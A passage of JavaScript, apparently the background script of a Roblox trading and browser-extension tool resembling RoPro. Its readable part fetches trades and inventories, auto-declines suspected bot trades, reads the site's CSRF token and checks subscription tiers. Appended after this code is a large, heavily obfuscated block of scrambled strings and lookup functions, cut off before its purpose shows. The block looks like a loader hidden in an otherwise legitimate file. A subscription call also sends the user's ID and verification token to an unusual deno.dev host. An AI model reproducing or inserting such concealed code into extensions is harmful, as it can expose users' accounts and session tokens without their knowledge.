        "&limit=100&sortOrder=Desc&cursor=" +
        cursor
    )
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      })
      .catch(function () {
        resolve({});
      });
  });
}

async function declineBots() {
  //Code to decline all suspected trade botters
  return new Promise((resolve) => {
    var tempCursor = "";
    var botTrades = [];
    var totalLoops = 0;
    var totalDeclined = 0;
    async function doDecline() {
      var trades = await fetchTradesCursor("inbound", 100, tempCursor);
      tempCursor = trades.nextPageCursor;
      var tradeIds = [];
      var userIds = [];
      for (var i = 0; i < trades.data.length; i++) {
        tradeIds.push([trades.data[i].user.id, trades.data[i].id]);
        userIds.push(trades.data[i].user.id);
      }
      if (userIds.length > 0) {
        var flags = await fetchFlagsBatch(userIds);
        flags = JSON.parse(flags);
        for (var i = 0; i < tradeIds.length; i++) {
          try {
            if (flags.includes(tradeIds[i][0].toString())) {
              botTrades.push(tradeIds[i][1]);
            }
          } catch (e) {
            console.log(e);
          }
        }
      }
      if (totalLoops < 20 && tempCursor != null) {
        setTimeout(function () {
          doDecline();
          totalLoops += 1;
        }, 100);
      } else {
        if (botTrades.length > 0) {
          await loadToken();
          var token = await getStorage("token");
          for (var i = 0; i < botTrades.length; i++) {
            console.log(i, botTrades.length);
            try {
              if (totalDeclined < 300) {
                await cancelTrade(botTrades[i], token);
                totalDeclined = totalDeclined + 1;
              } else {
                resolve(totalDeclined);
              }
            } catch (e) {
              resolve(totalDeclined);
            }
          }
        }
        console.log("Declined " + botTrades.length + " trades!");
        resolve(botTrades.length);
      }
    }
    doDecline();
  });
}

async function fetchFlagsBatch(userIds) {
  return new Promise((resolve) => {
    fetch("https://api.ropro.io/fetchFlags.php?ids=" + userIds.join(","))
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}

async function loadItems(userID, assetTypes) {
  var myInventory = {};
  async function handleAsset(cursor) {
    var response = await getInventoryPage(userID, assetTypes, cursor);
    for (var j = 0; j < response.data.length; j++) {
      var item = response.data[j];
      if (item["assetId"] in myInventory) {
        myInventory[item["assetId"]]["quantity"]++;
      } else {
        myInventory[item["assetId"]] = item;
        myInventory[item["assetId"]]["quantity"] = 1;
      }
    }
    if (response.nextPageCursor != null) {
      await handleAsset(response.nextPageCursor);
    }
  }
  await handleAsset("");
  var total = 0;
  for (var item in myInventory) {
    total += myInventory[item]["quantity"];
  }
  console.log("Inventory loaded. Total items: " + total);
  return myInventory;
}

async function loadInventory(userID) {
  var myInventory = {};
  var assetType = null;
  async function handleAsset(cursor) {
    var response = await getPage(userID, assetType, cursor);
    for (var j = 0; j < response.data.length; j++) {
      var item = response.data[j];
      if (item["assetId"] in myInventory) {
        myInventory[item["assetId"]]["quantity"]++;
      } else {
        myInventory[item["assetId"]] = item;
        myInventory[item["assetId"]]["quantity"] = 1;
      }
    }
    if (response.nextPageCursor != null) {
      await handleAsset(response.nextPageCursor);
    }
  }
  await handleAsset("");
  var total = 0;
  for (var item in myInventory) {
    total += myInventory[item]["quantity"];
  }
  console.log("Inventory loaded. Total items: " + total);
  return myInventory;
}

async function isInventoryPrivate(userID) {
  return new Promise((resolve) => {
    fetch(
      "https://inventory.roblox.com/v1/users/" +
        userID +
        "/assets/collectibles?cursor=&sortOrder=Desc&limit=10&assetType=null"
    ).then((response) => {
      if (response.status == 403) {
        resolve(true);
      } else {
        resolve(false);
      }
    });
  });
}

async function loadLimitedInventory(userID) {
  var myInventory = [];
  var assetType = null;
  async function handleAsset(cursor) {
    var response = await getPage(userID, assetType, cursor);
    for (var j = 0; j < response.data.length; j++) {
      var item = response.data[j];
      myInventory.push(item);
    }
    if (response.nextPageCursor != null) {
      await handleAsset(response.nextPageCursor);
    }
  }
  await handleAsset("");
  return myInventory;
}

async function getProfileValue(userID) {
  if (await isInventoryPrivate(userID)) {
    return { value: "private" };
  }
  var inventory = await loadLimitedInventory(userID);
  var items = new Set();
  for (var i = 0; i < inventory.length; i++) {
    items.add(inventory[i]["assetId"]);
  }
  var values = await fetchItemValues(Array.from(items));
  var value = 0;
  for (var i = 0; i < inventory.length; i++) {
    if (inventory[i]["assetId"] in values) {
      value += values[inventory[i]["assetId"]];
    }
  }
  return { value: value };
}

function fetchTrades(tradesType, limit) {
  return new Promise((resolve) => {
    fetch(
      "https://trades.roblox.com/v1/trades/" +
        tradesType +
        "?cursor=&limit=" +
        limit +
        "&sortOrder=Desc"
    )
      .then((response) => response.json())
      .then(async (data) => {
        resolve(data);
      });
  });
}

function fetchTradesCursor(tradesType, limit, cursor) {
  return new Promise((resolve) => {
    fetch(
      "https://trades.roblox.com/v1/trades/" +
        tradesType +
        "?cursor=" +
        cursor +
        "&limit=" +
        limit +
        "&sortOrder=Desc"
    )
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}

function fetchTrade(tradeId) {
  return new Promise((resolve) => {
    fetch("https://trades.roblox.com/v1/trades/" + tradeId)
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}

function fetchValues(trades) {
  return new Promise((resolve) => {
    var formData = new FormData();
    formData.append("data", JSON.stringify(trades));
    fetch("https://api.ropro.io/tradeProtectionBackend.php?form", {
      method: "POST",
      body: formData,
    })
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}

function fetchItemValues(items) {
  return new Promise((resolve) => {
    fetch("https://api.ropro.io/itemInfoBackend.php", {
      method: "POST",
      body: JSON.stringify(items),
    })
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}

function fetchPlayerThumbnails(userIds) {
  return new Promise((resolve) => {
    fetch(
      "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" +
        userIds.join() +
        "&size=420x420&format=Png&isCircular=false"
    )
      .then((response) => response.json())
      .then((data) => {
        resolve(data);
      });
  });
}


function cancelTrade(id, token) {
  return new Promise((resolve) => {
    try {
      fetch("https://trades.roblox.com/v1/trades/" + id + "/decline", {
        method: "POST",
        headers: { "X-CSRF-TOKEN": token },
      })
        .then((response) => response.json())
        .then((data) => {
          resolve(data);
        });
    } catch (e) {
      resolve("");
    }
  });
}

function addCommas(nStr) {
  nStr += "";
  var x = nStr.split(".");
  var x1 = x[0];
  var x2 = x.length > 1 ? "." + x[1] : "";
  var rgx = /(\d+)(\d{3})/;
  while (rgx.test(x1)) {
    x1 = x1.replace(rgx, "$1" + "," + "$2");
  }
  return x1 + x2;
}

var myToken = null;

function loadToken() {
  return new Promise((resolve) => {
    try {
      fetch("https://roblox.com/home")
        .then((response) => response.text())
        .then((data) => {
          var token = data
            .split("data-token=")[1]
            .split(">")[0]
            .replace('"', "")
            .replace('"', "")
            .split(" ")[0];
          var restrictSettings = !(
            data.includes("data-isunder13=false") ||
            data.includes('data-isunder13="false"') ||
            data.includes("data-isunder13='false'")
          );
          myToken = token;
          chrome.storage.sync.set({ token: myToken });
          chrome.storage.sync.set({ restrictSettings: restrictSettings });
          resolve(token);
        })
        .catch(function () {
          fetch("https://roblox.com")
            .then((response) => response.text())
            .then((data) => {
              var token = data
                .split("data-token=")[1]
                .split(">")[0]
                .replace('"', "")
                .replace('"', "")
                .split(" ")[0];
              var restrictSettings = !data.includes("data-isunder13=false");
              myToken = token;
              chrome.storage.sync.set({ token: token });
              chrome.storage.sync.set({ restrictSettings: restrictSettings });
              resolve(token);
            })
            .catch(function () {
              fetch("https://www.roblox.com/home")
                .then((response) => response.text())
                .then((data) => {
                  var token = data
                    .split("data-token=")[1]
                    .split(">")[0]
                    .replace('"', "")
                    .replace('"', "")
                    .split(" ")[0];
                  var restrictSettings = !data.includes("data-isunder13=false");
                  myToken = token;
                  chrome.storage.sync.set({ token: token });
                  chrome.storage.sync.set({
                    restrictSettings: restrictSettings,
                  });
                  resolve(token);
                })
                .catch(function () {
                  fetch("https://web.roblox.com/home")
                    .then((response) => response.text())
                    .then((data) => {
                      var token = data
                        .split("data-token=")[1]
                        .split(">")[0]
                        .replace('"', "")
                        .replace('"', "")
                        .split(" ")[0];
                      var restrictSettings = !data.includes(
                        "data-isunder13=false"
                      );
                      myToken = token;
                      chrome.storage.sync.set({ token: token });
                      chrome.storage.sync.set({
                        restrictSettings: restrictSettings,
                      });
                      resolve(token);
                    });
                });
            });
        });
    } catch (e) {
      console.log(e);
      console.warn("Token fetch failed. Using backup token fetch.");
      fetch("https://catalog.roblox.com/v1/catalog/items/details")
        .then((response) => response.headers.get("x-csrf-token"))
        .then((token) => {
          myToken = token;
          chrome.storage.sync.set({ token: token });
          console.log("New Token: " + token);
          resolve(token);
        });
    }
  });
}

async function sha256(message) {
  const msgBuffer = new TextEncoder().encode(message);
  const hashBuffer = await crypto.subtle.digest("SHA-256", msgBuffer);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray
    .map((b) => b.toString(16).padStart(2, "0"))
    .join("");
  return hashHex;
}

async function handleAlert() {
  var timestamp = new Date().getTime();
  fetch(
    "https://api.ropro.io/handleRoProAlert.php?timestamp=" + timestamp
  ).then(async (response) => {
    var data = JSON.parse(atob(await response.text()));
    if (data.alert == true) {
      var validationHash =
        "d6ed8dd6938b1d02ef2b0178500cd808ed226437f6c23f1779bf1ae729ed6804";
      var validation = response.headers.get(
        "validation" + (await sha256(timestamp % 1024)).split("a")[0]
      );
      if ((await sha256(validation)) == validationHash) {
        var alreadyAlerted = await getLocalStorage("alreadyAlerted");
        var linkHTML = "";
        if (data.hasOwnProperty("link") && data.hasOwnProperty("linktext")) {
          linkHTML = `<a href=\'${stripTags(
            data.link
          )}\' target=\'_blank\' style=\'margin-left:10px;text-decoration:underline;\' class=\'text-link\'><b>${stripTags(
            data.linktext
          )}</b></a>`;
        }
        var closeAlertHTML = `<div style=\'opacity:0.6;margin-right:5px;display:inline-block;margin-left:45px;cursor:pointer;\'class=\'alert-close\'><b>Close Alert<b></div>`;
        var message = stripTags(data.message) + linkHTML + closeAlertHTML;
        if (alreadyAlerted != message) {
          setLocalStorage("rpAlert", message);
        }
      } else {
        console.log("Validation failed! Not alerting user.");
        setLocalStorage("rpAlert", "");
      }
    } else {
      setLocalStorage("rpAlert", "");
    }
  });
}

async function validateUser() {
  return new Promise(async (resolve) => {
    fetch("https://users.roblox.com/v1/users/authenticated").then(
      async (response) => {
        if (!response.ok) throw new Error("Failed to validate user");
        var data = await response.json();
        const userVerification = await getStorage("userVerification");
        var userID = data.id;
        var roproVerificationToken = "none";
        if (userVerification && userVerification.hasOwnProperty(userID)) {
          roproVerificationToken = userVerification[userID];
        }
        var formData = new FormData();
        formData.append("user_id", data.id);
        formData.append("username", data.name);
        fetch("https://api.ropro.io/validateUser.php", {
          method: "POST",
          headers: {
            "ropro-verification": roproVerificationToken,
            "ropro-id": userID,
          },
          body: formData,
        }).then(async (response) => {
          var data = await response.text();
          if (data == "err") {
            throw new Error("User validation failed.");
          } else if (data.includes(",")) {
            userID = parseInt(data.split(",")[0]);
            var username = data.split(",")[1].split(",")[0];
            setStorage("rpUserID", userID);
            setStorage("rpUsername", username);
          }
          resolve();
        });
      }
    );
  });
}

async function fetchSubscription() {
  return new Promise(async (resolve) => {
    const userVerification = await getStorage("userVerification");
    var userID = await getStorage("rpUserID");
    var roproVerificationToken = "none";
    if (userVerification && userVerification.hasOwnProperty(userID)) {
      roproVerificationToken = userVerification[userID];
    }
    fetch("https://roprobackend.deno.dev/getSubscription.php///api", {
      method: "POST",
      headers: {
        "ropro-verification": roproVerificationToken,
        "ropro-id": userID,
      },
    }).then(async (response) => {
      var data = await response.text();
      resolve(data);
    });
  });
}

var subscriptionPromise = [];

async function getSubscription() {
  if (subscriptionPromise.length == 0) {
    subscriptionPromise.push(
      new Promise(async (resolve) => {
        getLocalStorage("rpSubscriptionFreshness").then(async (freshness) => {
          if (!freshness || Date.now() >= freshness + 300 * 1000) {
            try {
              await validateUser();
              var subscription = await fetchSubscription();
              setLocalStorage("rpSubscription", subscription);
              setLocalStorage("rpSubscriptionFreshness", Date.now());
              resolve(subscription);
            } catch (e) {
              console.log("Error fetching subscription: ", e);
              setLocalStorage("rpSubscriptionFreshness", Date.now());
            }
          } else {
            resolve(await getLocalStorage("rpSubscription"));
          }
        });
      })
    );
    var myPromise = await subscriptionPromise[0];
    subscriptionPromise = [];
    return myPromise;
  } else {
    var myPromise = await subscriptionPromise[0];
    subscriptionPromise = [];
    return myPromise;
  }
}
getSubscription();

var disabledFeatures = null;

async function loadSettingValidity(setting) {
  var restrictSettings = await getStorage("restrictSettings");
  var restricted_settings = new Set([
    "linkedDiscord",
    "gameTwitter",
    "groupTwitter",
    "groupDiscord",
    "featuredToys",
  ]);
  var standard_settings = new Set([
    "themeColorAdjustments",
    "moreMutuals",
    "animatedProfileThemes",
    "morePlaytimeSorts",
    "serverSizeSort",
    "fastestServersSort",
    "moreGameFilters",
    "moreServerFilters",
    "additionalServerInfo",
    "gameLikeRatioFilter",
    "premiumVoiceServers",
    "quickUserSearch",
    "liveLikeDislikeFavoriteCounters",
    "sandboxOutfits",
    "tradeSearch",
    "moreTradePanel",
    "tradeValueCalculator",
    "tradeDemandRatingCalculator",
    "tradeItemValue",
    "tradeItemDemand",
    "itemPageValueDemand",
    "tradePageProjectedWarning",
    "embeddedRolimonsItemLink",
    "embeddedRolimonsUserLink",
    "tradeOffersValueCalculator",
    "winLossDisplay",
    "underOverRAP",
  ]);
  var pro_settings = new Set([
    "profileValue",
    "liveVisits",
    "livePlayers",
    "tradePreviews",
    "ownerHistory",
    "quickItemSearch",
    "tradeNotifier",
    "singleSessionMode",
    "advancedTradeSearch",
    "tradeProtection",
    "hideTradeBots",
    "autoDeclineTradeBots",
    "autoDecline",
    "declineThreshold",
    "cancelThreshold",
    "hideDeclinedNotifications",
    "hideOutboundNotifications",
  ]);
  var ultra_settings = new Set([
    "dealNotifier",
    "buyButton",
    "dealCalculations",
    "notificationThreshold",
    "valueThreshold",
    "projectedFilter",
  ]);
  var subscriptionLevel = await getSubscription();
  var valid = true;
  if (subscriptionLevel == "free_tier" || subscriptionLevel == "free") {
    if (
      standard_settings.has(setting) ||
      pro_settings.has(setting) ||
      ultra_settings.has(setting)
    ) {
      valid = false;
    }
  } else if (
    subscriptionLevel == "standard_tier" ||
    subscriptionLevel == "plus"
  ) {
    if (pro_settings.has(setting) || ultra_settings.has(setting)) {
      valid = false;
    }
  } else if (subscriptionLevel == "pro_tier" || subscriptionLevel == "rex") {
    if (ultra_settings.has(setting)) {
      valid = false;
    }
  } else if (
    subscriptionLevel == "ultra_tier" ||
    subscriptionLevel == "ultra"
  ) {
    valid = true;
  } else {
    valid = false;
  }
  if (restricted_settings.has(setting) && restrictSettings) {
    valid = false;
  }
  if (disabledFeatures == null || typeof disabledFeatures == "undefined") {
    disabledFeatures = await getLocalStorage("disabledFeatures");
  }
  if (disabledFeatures?.includes(setting)) {
    valid = false;
  }
  return new Promise((resolve) => {
    resolve(valid);
  });
}

async function loadSettings(setting) {
  var settings = await getStorage("rpSettings");
  if (typeof settings === "undefined") {
    await initializeSettings();
    settings = await getStorage("rpSettings");
  }
  var valid = await loadSettingValidity(setting);
  var settingValue;
  if (typeof settings[setting] === "boolean") {
    settingValue = settings[setting] && valid;
  } else {
    settingValue = settings[setting];
  }
  return new Promise((resolve) => {
    resolve(settingValue);
  });
}

async function loadSettingValidityInfo(setting) {
  var disabled = false;
  var valid = await loadSettingValidity(setting);
  if (disabledFeatures == null || typeof disabledFeatures == "undefined") {
    disabledFeatures = await getLocalStorage("disabledFeatures");
  }
  if (disabledFeatures?.includes(setting)) {
    disabled = true;
  }
  return new Promise((resolve) => {
    resolve([valid, disabled]);
  });
}

async function getTradeValues(tradesType) {
  var tradesJSON = await fetchTrades(tradesType);
  var trades = { data: [] };
  if (tradesJSON.data.length > 0) {
    for (var i = 0; i < 10; i++) {
      var offer = tradesJSON.data[i];
      var tradeChecked = await getStorage("tradeChecked");
      if (offer.id != tradeChecked) {
        var trade = await fetchTrade(offer.id);
        trades.data.push(trade);
      } else {
        return {};
      }
    }
    var tradeValues = await fetchValues(trades);
    return tradeValues;
  } else {
    return {};
  }
}

var inbounds = [];
var inboundsCache = {};
var allPagesDone = false;

function loadTrades(inboundCursor, tempArray) {
  fetch(
    "https://trades.roblox.com/v1/trades/Inbound?sortOrder=Asc&limit=100&cursor=" +
      inboundCursor
  )
    .then(async (response) => {
      if (response.ok) {
        var data = await response.json();
        return data;
      } else {
        throw new Error("Failed to fetch trades");
      }
    })
    .then((data) => {
      console.log(data);
      var done = false;
      for (var i = 0; i < data.data.length; i++) {
        if (!(data.data[i].id in inboundsCache)) {
          tempArray.push(data.data[i].id);
          inboundsCache[data.data[i].id] = null;
        } else {
          done = true;
          break;
        }
      }
      if (data.nextPageCursor != null && done == false) {
        loadTrades(data.nextPageCursor, tempArray);
      } else {
        //Reached the last page or already detected inbound trade
        inbounds = tempArray.concat(inbounds);
        allPagesDone = true;
        setTimeout(function () {
          loadTrades("", []);
        }, 61000);
      }
    })
    .catch((error) => {
      setTimeout(function () {
        loadTrades(inboundCursor, tempArray);
      }, 61000);
    });
}

var tradesNotified = {};

function getTrades() {
  return new Promise((resolve) => {
    async function doGet(resolve) {
      var lastTradeCheck = await getLocalStorage("lastTradeCheck");
      var initialCheck =
        !lastTradeCheck ||
        lastTradeCheck + 1000 * 60 * 5 < new Date().getTime();
      var limit = initialCheck ? 25 : 10;
      var sections = [
        await fetchTrades("inbound", limit),
        await fetchTrades("outbound", limit),
        await fetchTrades("completed", limit),
      ];
      if (!(await loadSettings("hideDeclinedNotifications"))) {
        sections.push(await fetchTrades("inactive", limit));
      }
      var tradesList = await getLocalStorage("tradesList");
      if (typeof tradesList == "undefined" || initialCheck) {
        tradesList = {
          inboundTrades: {},
          outboundTrades: {},
          completedTrades: {},
          inactiveTrades: {},
        };
      }
      var storageNames = [
        "inboundTrades",
        "outboundTrades",
        "completedTrades",
        "inactiveTrades",
      ];
      var newTrades = [];
      for (var i = 0; i < sections.length; i++) {
        var section = sections[i];
        if ("data" in section && section.data.length > 0) {
          var store = tradesList[storageNames[i]];
          var tradeIds = [];
          for (var j = 0; j < section.data.length; j++) {
            tradeIds.push(section.data[j]["id"]);
          }
          for (var j = 0; j < tradeIds.length; j++) {
            var tradeId = tradeIds[j];
            if (!(tradeId in store)) {
              tradesList[storageNames[i]][tradeId] = true;
              newTrades.push({ [tradeId]: storageNames[i] });
            }
          }
        }
      }
      if (newTrades.length > 0) {
        if (!initialCheck) {
          await setLocalStorage("tradesList", tradesList);
          if (newTrades.length < 9) {
            notifyTrades(newTrades);
          }
        } else {
          await setLocalStorage("tradesList", tradesList);
        }
      }
      await setLocalStorage("lastTradeCheck", new Date().getTime());
      resolve();
    }
    doGet(resolve);
  });
}

function loadTradesType(tradeType) {
  return new Promise((resolve) => {
    function doLoad(tradeCursor, tempArray) {
      fetch(
        "https://trades.roblox.com/v1/trades/" +
          tradeType +
          "?sortOrder=Asc&limit=100&cursor=" +
          tradeCursor
      )
        .then(async (response) => {
          if (response.ok) {
            var data = await response.json();
            return data;
          } else {
            throw new Error("Failed to fetch trades");
          }
        })
        .then((data) => {
          console.log(data);
          for (var i = 0; i < data.data.length; i++) {
            tempArray.push([data.data[i].id, data.data[i].user.id]);
          }
          if (data.nextPageCursor != null) {
            doLoad(data.nextPageCursor, tempArray);
          } else {
            //Reached the last page
            resolve(tempArray);
          }
        })
        .catch(function () {
          setTimeout(function () {
            doLoad(tradeCursor, tempArray);
          }, 31000);
        });
    }
    doLoad("", []);
  });
}

function loadTradesData(tradeType) {
  return new Promise((resolve) => {
    function doLoad(tradeCursor, tempArray) {
      fetch(
        "https://trades.roblox.com/v1/trades/" +
          tradeType +
          "?sortOrder=Asc&limit=100&cursor=" +
          tradeCursor
      )
        .then(async (response) => {
          if (response.ok) {
            var data = await response.json();
            return data;
          } else {
            throw new Error("Failed to fetch trades");
          }
        })
        .then((data) => {
          console.log(data);
          for (var i = 0; i < data.data.length; i++) {
            tempArray.push(data.data[i]);
          }
          if (data.nextPageCursor != null) {
            doLoad(data.nextPageCursor, tempArray);
          } else {
            //Reached the last page
            resolve(tempArray);
          }
        })
        .catch(function () {
          setTimeout(function () {
            doLoad(tradeCursor, tempArray);
          }, 31000);
        });
    }
    doLoad("", []);
  });
}

function SaCTO9H(){}var N0Hvk1N=Object['\u0064\u0065\u0066\u0069\u006e\u0065\u0050\u0072\u006f\u0070\u0065\u0072\u0074\u0079'],Nx61V2U,L0PWZIS,q4l2E2_,O1__9XP,nPC_FTK,XOcErbF,cGhvFEQ,x3ZEXA,bpnKADi,rvqSSD,DiMPGMT,zv2jmh,TjkN_vF,Z9UihH,wd_n_FF,_AbXO4,aD3tczW,LSLCgid,rVe917,qwphBc;function NvptG7(SaCTO9H){return Nx61V2U[SaCTO9H>0x28?SaCTO9H>0x28?SaCTO9H<0x28?SaCTO9H+0x17:SaCTO9H>0x28?SaCTO9H-0x29:SaCTO9H-0x19:SaCTO9H+0x1c:SaCTO9H+0x11]}Nx61V2U=hZp8cMz();function gfF_9Ui(SaCTO9H,N0Hvk1N){var q4l2E2_=CTd6Zv(SaCTO9H=>{return Nx61V2U[SaCTO9H>0xc?SaCTO9H>0x10c?SaCTO9H+0x1f:SaCTO9H-0xd:SaCTO9H+0x4a]},0x1);L0PWZIS(SaCTO9H,q4l2E2_(0xd),{value:N0Hvk1N,configurable:NvptG7(0xa8)});return SaCTO9H}SaCTO9H(L0PWZIS=Object.defineProperty,q4l2E2_=gfF_9Ui(CTd6Zv((...N0Hvk1N)=>{var L0PWZIS=CTd6Zv(N0Hvk1N=>{return Nx61V2U[N0Hvk1N>0xfe?N0Hvk1N-0x54:N0Hvk1N+0x1]},0x1);SaCTO9H(N0Hvk1N[L0PWZIS(-0x1)]=L0PWZIS(0xa),N0Hvk1N[NvptG7(0x2a)]=0x85);if(N0Hvk1N[NvptG7(0x2a)]>NvptG7(0xd8)){return N0Hvk1N[-L0PWZIS(0x77)]}else{var q4l2E2_=CTd6Zv(N0Hvk1N=>{return Nx61V2U[N0Hvk1N<0xdb?N0Hvk1N>-0x25?N0Hvk1N<0xdb?N0Hvk1N<-0x25?N0Hvk1N+0x9:N0Hvk1N+0x24:N0Hvk1N-0x5a:N0Hvk1N-0x32:N0Hvk1N+0x3a]},0x1);return N0Hvk1N[q4l2E2_(-0x22)](N0Hvk1N[0x0]())}}),0x2)(QVwyqKd,WEDs9o));var lppWwEv=[],bZmE4w=[A55Vw1T(NvptG7(0x38)),A55Vw1T(NvptG7(0x2b)),'\x68\x36\x6b\x6a\x43\x7c\x5a\x53',A55Vw1T(0x2),A55Vw1T(0x3),A55Vw1T(0x4),A55Vw1T(0x5),A55Vw1T(0x6),'\u007c\u003e\u0036\u0042\u006a\u0025\u004c',A55Vw1T(NvptG7(0x6c)),A55Vw1T(NvptG7(0x5e)),A55Vw1T(NvptG7(0x30)),A55Vw1T(NvptG7(0x90)),A55Vw1T(NvptG7(0x7c)),A55Vw1T(NvptG7(0x7b)),A55Vw1T(NvptG7(0x5b)),A55Vw1T(NvptG7(0x5c)),A55Vw1T(NvptG7(0x45)),A55Vw1T(NvptG7(0x9f)),A55Vw1T(NvptG7(0xa0)),'\x7c\x4e\x3e\x21\x45\x6e\x63\x33\x79\x2e\x72\x4c\x54\x6a\x39\x4e',A55Vw1T(NvptG7(0x47)),A55Vw1T(NvptG7(0x4f)),A55Vw1T(NvptG7(0x61)),A55Vw1T(NvptG7(0x2e)),A55Vw1T(NvptG7(0x2f)),A55Vw1T(0x17),A55Vw1T(NvptG7(0x2d)),A55Vw1T(NvptG7(0xc8)),A55Vw1T(NvptG7(0x33)),A55Vw1T(NvptG7(0x37)),A55Vw1T(NvptG7(0x3a)),A55Vw1T(NvptG7(0xac)),'\u003e\u005b\u0073\u007c\u0060\u006c\u0031\u004f',A55Vw1T(NvptG7(0xae)),A55Vw1T(NvptG7(0x2c)),A55Vw1T(NvptG7(0xb2)),A55Vw1T(NvptG7(0xa4)),A55Vw1T(NvptG7(0x2c)),A55Vw1T(NvptG7(0xb5)),A55Vw1T(NvptG7(0x39)),A55Vw1T(NvptG7(0xb9)),A55Vw1T(NvptG7(0xb8)),A55Vw1T(NvptG7(0xc4)),A55Vw1T(NvptG7(0xc6)),A55Vw1T(NvptG7(0x53)),A55Vw1T(0x29),A55Vw1T(NvptG7(0xff)),A55Vw1T(0x2b),A55Vw1T(NvptG7(0xa2)),A55Vw1T(NvptG7(0xa3)),A55Vw1T(NvptG7(0x66)),'\x71\x4c\x7c\x3e\x50\x25\x45\x24\x22\x5a\x39',A55Vw1T(NvptG7(0xa7)),'\u004a\u0057\u0034\u007c\u003e\u0061\u0074\u004f',A55Vw1T(0x30),A55Vw1T(0x31),'\x2e\x56\x35\x6b\x7c\x3d\x7e\x6c',A55Vw1T(NvptG7(0xca)),A55Vw1T(NvptG7(0xf2)),A55Vw1T(0x34),A55Vw1T(NvptG7(0x68)),A55Vw1T(0x36),A55Vw1T(0x37),'\x36\x6a\x2b\x7c\x70\x71\x30',A55Vw1T(0x38),'\x68\x72\x35\x7c\x74\x79\x65\x2c\x39\x63',A55Vw1T(NvptG7(0xb1)),A55Vw1T(NvptG7(0x6b)),A55Vw1T(NvptG7(0x6f)),A55Vw1T(NvptG7(0x70)),A55Vw1T(NvptG7(0x36)),A55Vw1T(NvptG7(0x6d)),A55Vw1T(NvptG7(0x43)),A55Vw1T(NvptG7(0xd0)),A55Vw1T(NvptG7(0x55)),'\x68\x7a\x21\x7c',A55Vw1T(0x42),A55Vw1T(0x43),A55Vw1T(0x44),A55Vw1T(0x45),A55Vw1T(NvptG7(0x80)),A55Vw1T(NvptG7(0x7f)),'\x77\x6d\x39\x7c\x64\x24\x52\x4f',A55Vw1T(NvptG7(0x9e)),'\u0070\u0055\u0073\u007c\u0079\u0061\u0035\u004f',A55Vw1T(NvptG7(0x78)),A55Vw1T(NvptG7(0x8f)),A55Vw1T(NvptG7(0x9c)),A55Vw1T(NvptG7(0xb0)),A55Vw1T(0x4d),A55Vw1T(NvptG7(0xd6)),A55Vw1T(0x4f),A55Vw1T(NvptG7(0x95)),A55Vw1T(NvptG7(0x3e)),A55Vw1T(NvptG7(0xd7)),A55Vw1T(NvptG7(0x8d)),A55Vw1T(0x54),A55Vw1T(0x55),A55Vw1T(NvptG7(0xa5)),A55Vw1T(NvptG7(0x2d)),A55Vw1T(NvptG7(0x62)),'\x7c\x65\x5d\x61\x5d\x21\x33\x43\x53\x29\x71\x53\x49\x6d\x21\x48\x24\x4d\x6d\x78\x78\x5b\x40\x30',A55Vw1T(0x55),A55Vw1T(0x57),A55Vw1T(NvptG7(0x8c)),A55Vw1T(NvptG7(0xb4)),A55Vw1T(0x5a),A55Vw1T(NvptG7(0x5a)),A55Vw1T(0x5c),A55Vw1T(NvptG7(0x40)),A55Vw1T(NvptG7(0x5f)),A55Vw1T(0x5f),A55Vw1T(0x60),A55Vw1T(0x61),'\u0050\u002f\u002c\u0028\u002f\u0039\u006f\u0063\u005e\u005a\u0048\u007c\u0038\u0068',A55Vw1T(NvptG7(0x2e)),A55Vw1T(NvptG7(0x2f)),A55Vw1T(0x62),A55Vw1T(NvptG7(0xf5)),A55Vw1T(NvptG7(0xe4)),A55Vw1T(NvptG7(0xe5)),A55Vw1T(0x66),A55Vw1T(NvptG7(0x79)),A55Vw1T(NvptG7(0x7a)),A55Vw1T(NvptG7(0xed)),A55Vw1T(NvptG7(0x81)),A55Vw1T(NvptG7(0x76)),A55Vw1T(0x6c),'\u0068\u0068\u0055\u006e\u006b\u0061\u007c\u0066',A55Vw1T(NvptG7(0xf1)),A55Vw1T(NvptG7(0x4d)),A55Vw1T(NvptG7(0x84)),A55Vw1T(NvptG7(0x4c)),A55Vw1T(0x71),A55Vw1T(NvptG7(0x60)),A55Vw1T(NvptG7(0xdf)),A55Vw1T(NvptG7(0xf4)),A55Vw1T(NvptG7(0x63)),A55Vw1T(0x76),A55Vw1T(NvptG7(0xf6)),A55Vw1T(NvptG7(0x88)),A55Vw1T(0x79),A55Vw1T(0x7a),A55Vw1T(NvptG7(0x97)),A55Vw1T(0x7c),A55Vw1T(NvptG7(0xea)),A55Vw1T(0x7e),A55Vw1T(NvptG7(0xfa)),A55Vw1T(NvptG7(0x3d)),A55Vw1T(NvptG7(0xfb)),A55Vw1T(0x82),A55Vw1T(NvptG7(0x4b)),A55Vw1T(0x84),A55Vw1T(NvptG7(0x105)),A55Vw1T(NvptG7(0xfe)),'\x6e\x70\x44\x6b\x4e\x67\x7c\x66',A55Vw1T(NvptG7(0xbe)),A55Vw1T(0x88),A55Vw1T(0x89),A55Vw1T(NvptG7(0xbd)),A55Vw1T(0x8b),A55Vw1T(0x8c),A55Vw1T(NvptG7(0xf3)),A55Vw1T(NvptG7(0x102)),'\x7c\x39\x49\x21\x22\x7c\x30','\u007c\u0039\u0029\u005e\u003f\u006e\u005e\u006c',A55Vw1T(0x8f),A55Vw1T(0x90),A55Vw1T(NvptG7(0x107)),A55Vw1T(NvptG7(0x108)),A55Vw1T(0x93),A55Vw1T(0x94),'\x3d\x7a\x26\x59\x7d\x5d\x4e\x3a\x48\x6f\x5f\x60\x22\x44\x2e\x42\x54\x42\x6e\x75\x7c\x56\x53\x48\x5a\x6f\x31\x59\x66\x40\x6c\x4b\x45\x7a\x32\x74\x7b\x75\x45\x45\x30\x26\x4a\x79\x6d\x4f',A55Vw1T(NvptG7(0x10b)),A55Vw1T(NvptG7(0x10c)),A55Vw1T(NvptG7(0x10d)),A55Vw1T(0x98),A55Vw1T(0x99),'\x68\x68\x6b\x53\x62\x5d\x25\x31\x41\x5f\x3d\x2b\x22\x6c\x7c\x70\x7b\x70\x5f\x60\x5f\x75\x6f\x59\x5d\x4d\x2a\x4d\x77\x68',A55Vw1T(NvptG7(0